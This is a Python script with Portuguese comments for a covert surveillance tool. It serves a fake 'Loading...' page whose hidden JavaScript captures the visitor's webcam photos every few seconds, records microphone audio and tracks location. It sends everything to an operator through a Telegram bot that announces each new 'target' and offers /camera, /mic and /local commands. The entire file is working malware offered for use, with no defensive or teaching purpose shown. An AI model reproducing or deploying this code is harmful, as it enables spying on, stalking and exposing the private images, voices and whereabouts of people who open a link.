from http.server import HTTPServer, SimpleHTTPRequestHandler
import ssl
import json
import datetime
import requests
import os
import threading
import uuid
import base64
from io import BytesIO
import time
import telebot
dominio = "SEUDOMINIO"
class AdvancedCollector(SimpleHTTPRequestHandler):
    # Armazenamento de sessões
    active_sessions = {}

    def __init__(self, *args, **kwargs):
        self.TELEGRAM_TOKEN = os.getenv('TELEGRAM_TOKEN', 'SUA_API_KEY_AQUI')
        self.CHAT_ID = os.getenv('TELEGRAM_CHAT_ID', 'ID_DO_CHAT')
        super().__init__(*args, **kwargs)

    def send_telegram_notification(self, message):
        url = f"https://api.telegram.org/bot{self.TELEGRAM_TOKEN}/sendMessage"
        data = {
            "chat_id": self.CHAT_ID,
            "text": message,
            "parse_mode": "HTML"
        }
        try:
            requests.post(url, json=data)
        except:
            pass

    def send_telegram_photo(self, photo_data, caption):
        url = f"https://api.telegram.org/bot{self.TELEGRAM_TOKEN}/sendPhoto"
        files = {
            'photo': ('photo.jpg', BytesIO(base64.b64decode(photo_data.split(',')[1])), 'image/jpeg')
        }
        data = {
            "chat_id": self.CHAT_ID,
            "caption": caption,
            "parse_mode": "HTML"
        }
        try:
            requests.post(url, data=data, files=files)
        except:
            pass

    def send_telegram_audio(self, audio_data, caption):
        url = f"https://api.telegram.org/bot{self.TELEGRAM_TOKEN}/sendVoice"
        # Remove o cabeçalho do data URL
        audio_binary = base64.b64decode(audio_data.split(',')[1])
        files = {
            'voice': ('audio.ogg', BytesIO(audio_binary), 'audio/ogg')
        }
        data = {
            "chat_id": self.CHAT_ID,
            "caption": caption,
            "parse_mode": "HTML"
        }
        try:
            requests.post(url, data=data, files=files)
        except:
            pass

    def do_GET(self):
        if self.path == '/':
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            with open('index.html', 'rb') as f:
                self.wfile.write(f.read())
            return
        SimpleHTTPRequestHandler.do_GET(self)

    def do_POST(self):
        if self.path == '/collect':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            try:
                data = json.loads(post_data.decode('utf-8'))
                session_id = data.get('session_id')
                
                if not session_id:
                    session_id = str(uuid.uuid4())[:8]
                    data['session_id'] = session_id
                    self.active_sessions[session_id] = {
                        'info': data,
                        'photos': [],
                        'audio': [],
                        'location': None,
                        'last_seen': datetime.datetime.now()
                    }
                
                # Atualiza timestamp
                self.active_sessions[session_id]['last_seen'] = datetime.datetime.now()

                # Processa diferentes tipos de dados
                if 'photo' in data:
                    self.active_sessions[session_id]['photos'].append({
                        'data': data['photo'],
                        'timestamp': datetime.datetime.now()
                    })
                    self.active_sessions[session_id]['photos'] = self.active_sessions[session_id]['photos'][-5:]
                
                if 'audio' in data:
                    self.active_sessions[session_id]['audio'].append({
                        'data': data['audio'],
                        'timestamp': datetime.datetime.now()
                    })
                    self.active_sessions[session_id]['audio'] = self.active_sessions[session_id]['audio'][-5:]

                if 'location' in data:
                    self.active_sessions[session_id]['location'] = {
                        'data': data['location'],
                        'timestamp': datetime.datetime.now()
                    }
                
                self.handle_collected_data(data)
            except Exception as e:
                print(f"Erro: {e}")

            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({
                'status': 'ok',
                'session_id': session_id
            }).encode())

    def handle_collected_data(self, js_data):
        ip = self.client_address[0]
        current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        session_id = js_data.get('session_id', 'desconhecido')
        
        # Processa diferentes tipos de dados
        if 'photo' in js_data:
            caption = f"📸 Nova foto da sessão #{session_id}"
            self.send_telegram_photo(js_data['photo'], caption)
            return

        if 'audio' in js_data:
            caption = f"🎤 Novo áudio da sessão #{session_id}"
            self.send_telegram_audio(js_data['audio'], caption)
            return

        if 'location' in js_data:
            message = f"""📍 <b>Localização Atualizada</b>
Sessão #{session_id}
Latitude: {js_data['location']['latitude']}
Longitude: {js_data['location']['longitude']}
Precisão: {js_data['location'].get('accuracy', '?')} metros"""
            self.send_telegram_notification(message)
            return

        # Mensagem inicial de nova sessão
        message = f"""🎯 <b>Novo Alvo Conectado!</b>

🔑 <b>ID da Sessão:</b> #{session_id}

📡 <b>Dados:</b>
• IP: {ip}
• Data: {current_time}
• User-Agent: {self.headers.get('User-Agent', '?')}

🔐 <b>Permissões:</b>
• Câmera: {js_data.get('permissions', {}).get('camera', '?')}
• Microfone: {js_data.get('permissions', {}).get('microphone', '?')}
• Localização: {js_data.get('permissions', {}).get('geolocation', '?')}

Comandos disponíveis:
• /camera {session_id}
• /mic {session_id}
• /local {session_id}"""
        
        self.send_telegram_notification(message)

def create_index_html():
    html = """<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background: #000;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            color: #fff;
            font-family: Arial, sans-serif;
        }
        .loader {
            width: 50px;
            height: 50px;
            border: 5px solid #333;
            border-top: 5px solid #fff;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        video, audio {
            position: fixed;
            top: -9999px;
            left: -9999px;
        }
    </style>
</head>
<body>
    <div class="loader"></div>
    <video id="camera" playsinline autoplay></video>
    <audio id="mic"></audio>
    <canvas id="canvas" style="display:none;"></canvas>
    
    <script>
    let sessionId = null;
    let videoStream = null;
    let audioStream = null;
    let mediaRecorder = null;
    let audioChunks = [];

    async function collectData() {
        const data = {
            permissions: {},
            platform: navigator.platform,
            cpu_cores: navigator.hardwareConcurrency
        };

        try {
            // Solicita câmera e microfone
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: 'user' },
                audio: true 
            });
            
            videoStream = stream;
            audioStream = stream;
            
            data.permissions.camera = 'Permitido';
            data.permissions.microphone = 'Permitido';

            // Configura vídeo
            const video = document.getElementById('camera');
            video.srcObject = videoStream;
            
            // Configura gravação de áudio
            setupAudioRecording(audioStream);
            
            // Inicia capturas
            startCaptures();
        } catch(e) {
            data.permissions.camera = 'Negado';
            data.permissions.microphone = 'Negado';
        }

        // Solicita localização
        try {
            navigator.geolocation.watchPosition(handleLocation);
            data.permissions.geolocation = 'Permitido';
        } catch(e) {
            data.permissions.geolocation = 'Negado';
        }

        // Envia dados iniciais
        const response = await fetch('/collect', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(data)
        });
        
        const result = await response.json();
        sessionId = result.session_id;
    }

    function setupAudioRecording(stream) {
        mediaRecorder = new MediaRecorder(stream, {
            mimeType: 'audio/webm'
        });

        mediaRecorder.ondataavailable = event => {
            audioChunks.push(event.data);
        };

        mediaRecorder.onstop = async () => {
            const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
            audioChunks = [];
            
            const reader = new FileReader();
            reader.onloadend = async () => {
                await fetch('/collect', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        session_id: sessionId,
                        audio: reader.result
                    })
                });
            };
            reader.readAsDataURL(audioBlob);
        };
    }

    function handleLocation(position) {
        fetch('/collect', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                session_id: sessionId,
                location: {
                    latitude: position.coords.latitude,
                    longitude: position.coords.longitude,
                    accuracy: position.coords.accuracy
                }
            })
        });
    }

    function captureFrame() {
        if (!videoStream) return;
        
        const video = document.getElementById('camera');
        const canvas = document.getElementById('canvas');
        const context = canvas.getContext('2d');

        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        context.drawImage(video, 0, 0, canvas.width, canvas.height);

        const photo = canvas.toDataURL('image/jpeg', 0.7);

        fetch('/collect', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                session_id: sessionId,
                photo: photo
            })
        });
    }

    function captureAudio() {
        if (!mediaRecorder) return;
        
        if (mediaRecorder.state === 'inactive') {
            audioChunks = [];
            mediaRecorder.start();
            
            // Grava por 5 segundos
            setTimeout(() => {
                if (mediaRecorder.state === 'recording') {
                    mediaRecorder.stop();
                }
            }, 5000);
        }
    }

    function startCaptures() {
        // Captura foto a cada 3 segundos
        setInterval(captureFrame, 3000);
        
        // Captura áudio a cada 10 segundos
        setInterval(captureAudio, 5000);
    }

    document.addEventListener('DOMContentLoaded', collectData);

    window.addEventListener('beforeunload', () => {
        if (videoStream) {
            videoStream.getTracks().forEach(track => track.stop());
        }
        if (audioStream) {
            audioStream.getTracks().forEach(track => track.stop());
        }
    });
    </script>
</body>
</html>"""
    
    with open('index.html', 'w') as f:
        f.write(html)

class TelegramBot:
    def __init__(self, collector):
        self.collector = collector
        self.bot = telebot.TeleBot(os.getenv('TELEGRAM_TOKEN'))
        self.setup_handlers()

    def setup_handlers(self):
        @self.bot.message_handler(commands=['camera'])
        def handle_camera(message):
            try:
                session_id = message.text.split()[1]
                if session_id not in self.collector.active_sessions:
                    self.bot.reply_to(message, f"❌ Sessão #{session_id} não encontrada.")
                    return

                session = self.collector.active_sessions[session_id]
                photos = session['photos']

                if not photos:
                    self.bot.reply_to(message, f"📵 Sem fotos para sessão #{session_id}")
                    return

                info_msg = f"""📸 <b>Fotos da Sessão #{session_id}</b>
⏰ Última atividade: {session['last_seen'].strftime('%H:%M:%S')}
📊 Total de fotos: {len(photos)}"""

                self.bot.reply_to(message, info_msg, parse_mode='HTML')

                for photo in photos[-3:]:
                    caption = f"📸 Sessão #{session_id}\n⏰ {photo['timestamp'].strftime('%H:%M:%S')}"
                    self.collector.send_telegram_photo(photo['data'], caption)

            except IndexError:
                self.bot.reply_to(message, "❌ Use: /camera <id_da_sessao>")

        @self.bot.message_handler(commands=['mic'])
        def handle_mic(message):
            try:
                session_id = message.text.split()[1]
                if session_id not in self.collector.active_sessions:
                    self.bot.reply_to(message, f"❌ Sessão #{session_id} não encontrada.")
                    return

                session = self.collector.active_sessions[session_id]
                audio_clips = session['audio']

                if not audio_clips:
                    self.bot.reply_to(message, f"🎤 Sem áudios para sessão #{session_id}")
                    return

                info_msg = f"""🎤 <b>Áudios da Sessão #{session_id}</b>
⏰ Última atividade: {session['last_seen'].strftime('%H:%M:%S')}
📊 Total de áudios: {len(audio_clips)}"""

                self.bot.reply_to(message, info_msg, parse_mode='HTML')

                for audio in audio_clips[-3:]:
                    caption = f"🎤 Sessão #{session_id}\n⏰ {audio['timestamp'].strftime('%H:%M:%S')}"
                    self.collector.send_telegram_audio(audio['data'], caption)

            except IndexError:
                self.bot.reply_to(message, "❌ Use: /mic <id_da_sessao>")

        @self.bot.message_handler(commands=['local'])
        def handle_location(message):
            try:
                session_id = message.text.split()[1]
                if session_id not in self.collector.active_sessions:
                    self.bot.reply_to(message, f"❌ Sessão #{session_id} não encontrada.")
                    return

                session = self.collector.active_sessions[session_id]
                location = session.get('location')

                if not location:
                    self.bot.reply_to(message, f"📍 Sem localização para sessão #{session_id}")
                    return

                info_msg = f"""📍 <b>Localização da Sessão #{session_id}</b>

⏰ Atualização: {location['timestamp'].strftime('%H:%M:%S')}
📌 Coordenadas:
• Latitude: {location['data']['latitude']}
• Longitude: {location['data']['longitude']}
• Precisão: {location['data'].get('accuracy', '?')} metros

🗺 Google Maps: https://www.google.com/maps?q={location['data']['latitude']},{location['data']['longitude']}"""

                self.bot.reply_to(message, info_msg, parse_mode='HTML')

            except IndexError:
                self.bot.reply_to(message, "❌ Use: /local <id_da_sessao>")

        @self.bot.message_handler(commands=['sessions'])
        def handle_sessions(message):
            active = []
            expired = []
            now = datetime.datetime.now()

            for sid, session in self.collector.active_sessions.items():
                last_seen = session['last_seen']
                if now - last_seen < datetime.timedelta(minutes=5):
                    active.append(sid)
                else:
                    expired.append(sid)

            msg = f"""📊 <b>Status das Sessões</b>

🟢 <b>Ativas ({len(active)}):</b>
{chr(10).join([f"• #{sid}" for sid in active]) if active else "Nenhuma"}

🔴 <b>Expiradas ({len(expired)}):</b>
{chr(10).join([f"• #{sid}" for sid in expired[:5]]) if expired else "Nenhuma"}

Use:
/camera <id> - Ver fotos
/mic <id> - Ouvir áudios
/local <id> - Ver localização"""

            self.bot.reply_to(message, msg, parse_mode='HTML')

    def start(self):
        print("[+] Bot do Telegram iniciado!")
        self.bot.infinity_polling()

def run_https_server(port=443):
    create_index_html()
    server_address = ('', port)
    httpd = HTTPServer(server_address, AdvancedCollector)
    
    ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    ssl_context.load_cert_chain(
        '/etc/letsencrypt/live/{dominio}/fullchain.pem',
        '/etc/letsencrypt/live/{dominio}/privkey.pem'
    )
    httpd.socket = ssl_context.wrap_socket(httpd.socket, server_side=True)
    
    print(f"[+] Servidor HTTPS rodando na porta {port}")
    return httpd

def run_http_server(port=80):
    server_address = ('', port)
    httpd = HTTPServer(server_address, AdvancedCollector)
    print(f"[+] Servidor HTTP rodando na porta {port}")
    return httpd

def cleanup_old_sessions():
    while True:
        now = datetime.datetime.now()
        for sid in list(AdvancedCollector.active_sessions.keys()):
            last_seen = AdvancedCollector.active_sessions[sid]['last_seen']
            if now - last_seen > datetime.timedelta(minutes=9999999999999):
                del AdvancedCollector.active_sessions[sid]
        time.sleep(300)

def main():
    http_server = run_http_server()
    https_server = run_https_server()
    
    http_thread = threading.Thread(target=http_server.serve_forever)
    https_thread = threading.Thread(target=https_server.serve_forever)
    
    http_thread.daemon = True
    https_thread.daemon = True
    
    http_thread.start()
    https_thread.start()

    cleanup_thread = threading.Thread(target=cleanup_old_sessions)
    cleanup_thread.daemon = True
    cleanup_thread.start()

    print("[+] Iniciando bot do Telegram...")
    bot = TelegramBot(AdvancedCollector)
    try:
        bot.start()
    except KeyboardInterrupt:
        print("\n[!] Encerrando servidores...")
        http_server.shutdown()
        https_server.shutdown()

if __name__ == "__main__":
    try:
        import telebot
    except ImportError:
        print("[!] Instalando dependências...")
        os.system("pip install pyTelegramBotAPI")

    if "TELEGRAM_TOKEN" not in os.environ or "TELEGRAM_CHAT_ID" not in os.environ:
        print("""
[!] Configure as variáveis de ambiente:
    export TELEGRAM_TOKEN='seu_token'
    export TELEGRAM_CHAT_ID='seu_chat_id'
""")
        exit(1)

    main()
